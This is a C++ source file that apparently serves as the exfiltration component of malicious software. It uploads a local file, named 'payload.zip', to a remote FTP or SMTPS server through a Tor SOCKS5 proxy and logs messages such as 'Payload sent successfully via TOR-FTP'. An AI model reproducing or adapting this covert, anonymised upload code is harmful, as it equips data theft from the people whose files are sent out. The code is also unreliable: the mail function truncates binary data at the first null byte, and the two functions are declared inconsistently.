// File Uploader
#include "FileUploader.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <curl/curl.h>

namespace FileUploader {

    bool FileUploader::send_via_ftp_tor(
        const std::string& filePath,
        const std::string& ftpServer,
        const std::string& ftpUser,
        const std::string& ftpPassword,
        const std::string& remoteFilename
    ) {
        CURL *curl;
        CURLcode res;
        FILE *file = fopen(filePath.c_str(), "rb");
        if (!file) {
            std::cerr << "[FTP] Failed to open file: " << filePath << std::endl;
            return false;
        }

        curl = curl_easy_init();
        if (!curl) {
            std::cerr << "[FTP] curl_easy_init failed." << std::endl;
            fclose(file);
            return false;
        }

        std::string url = "ftp://" + ftpServer + "/" + remoteFilename;

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_USERPWD, (ftpUser + ":" + ftpPassword).c_str());
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_READDATA, file);
        curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5_HOSTNAME);
        curl_easy_setopt(curl, CURLOPT_PROXY, "127.0.0.1:9050");

        res = curl_easy_perform(curl);
        fclose(file);
        curl_easy_cleanup(curl);

        if (res != CURLE_OK) {
            std::cerr << "[FTP] curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
            return false;
        }

        std::cout << "[FTP] Payload sent successfully via TOR-FTP." << std::endl;
        return true;
    }

    bool send_via_smtp_tor(
        const std::string& filePath,
        const std::string& smtpServer,
        const std::string& smtpUser,
        const std::string& smtpPassword,
        const std::string& toAddress
    ) {
        CURL *curl;
        CURLcode res = CURLE_OK;
        struct curl_slist *recipients = nullptr;
        curl_mime *mime;
        curl_mimepart *part;

        std::ifstream file(filePath, std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "[SMTP] Failed to open file: " << filePath << std::endl;
            return false;
        }
        std::stringstream fileContents;
        fileContents << file.rdbuf();

        curl = curl_easy_init();
        if (!curl) {
            std::cerr << "[SMTP] curl_easy_init() failed" << std::endl;
            return false;
        }

        std::string fullURL = "smtps://" + smtpServer + ":465";

        curl_easy_setopt(curl, CURLOPT_USERNAME, smtpUser.c_str());
        curl_easy_setopt(curl, CURLOPT_PASSWORD, smtpPassword.c_str());
        curl_easy_setopt(curl, CURLOPT_URL, fullURL.c_str());
        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, ("<" + smtpUser + ">").c_str());

        recipients = curl_slist_append(recipients, ("<" + toAddress + ">").c_str());
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        // Configure SOCKS5 proxy (TOR routing)
        curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5_HOSTNAME);
        curl_easy_setopt(curl, CURLOPT_PROXY, "127.0.0.1:9050");

        mime = curl_mime_init(curl);
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "file");
        curl_mime_filename(part, "payload.zip");
        curl_mime_data(part, fileContents.str().c_str(), CURL_ZERO_TERMINATED);

        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "[SMTP] curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        } else {
            std::cout << "[SMTP] File sent successfully over TOR." << std::endl;
        }

        curl_slist_free_all(recipients);
        curl_mime_free(mime);
        curl_easy_cleanup(curl);

        return res == CURLE_OK;
    }

}
